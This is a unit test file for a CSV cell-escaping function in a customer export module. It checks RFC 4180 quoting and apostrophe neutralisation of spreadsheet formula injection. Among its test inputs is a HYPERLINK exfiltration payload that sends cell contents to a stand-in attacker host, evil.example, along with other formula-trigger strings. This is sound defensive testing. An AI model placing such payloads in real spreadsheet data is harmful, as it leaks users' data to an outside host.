import { describe, expect, it } from "vitest";

import { escapeCsvCell } from "@/lib/customer-csv";

describe("escapeCsvCell — RFC 4180 quoting", () => {
  it("passes plain text through unchanged", () => {
    expect(escapeCsvCell("Иван Петров")).toBe("Иван Петров");
  });

  it("returns empty for null/undefined/empty", () => {
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
    expect(escapeCsvCell("")).toBe("");
  });

  it("quotes and doubles quotes for commas/quotes/newlines", () => {
    expect(escapeCsvCell("a,b")).toBe('"a,b"');
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsvCell("line1\nline2")).toBe('"line1\nline2"');
  });
});

describe("escapeCsvCell — formula injection (CWE-1236)", () => {
  it("neutralizes cells starting with a formula trigger", () => {
    // Ведущий '=' в Excel/Sheets исполняется как формула — гасим апострофом.
    expect(escapeCsvCell("=1+1")).toBe("'=1+1");
    expect(escapeCsvCell("+79990000000")).toBe("'+79990000000");
    expect(escapeCsvCell("-2+3")).toBe("'-2+3");
    expect(escapeCsvCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralizes tab/CR-prefixed cells too", () => {
    // TAB не входит в набор кавычек RFC — остаётся просто с апострофом.
    expect(escapeCsvCell("\t=1")).toBe("'\t=1");
    // CR входит — поверх апострофа накладывается RFC-обрамление кавычками.
    expect(escapeCsvCell("\r=1")).toBe('"\'\r=1"');
  });

  it("neutralizes a HYPERLINK exfil payload in a name field", () => {
    const payload = '=HYPERLINK("http://evil.example/"&A1,"click")';
    const out = escapeCsvCell(payload);
    // запятая внутри → в кавычках; апостроф стоит ПЕРЕД '=', обезвреживая формулу
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out).toContain("HYPERLINK");
  });

  it("does not touch a normal leading digit or letter", () => {
    expect(escapeCsvCell("2021 Mercedes")).toBe("2021 Mercedes");
    expect(escapeCsvCell("BMW")).toBe("BMW");
  });
});
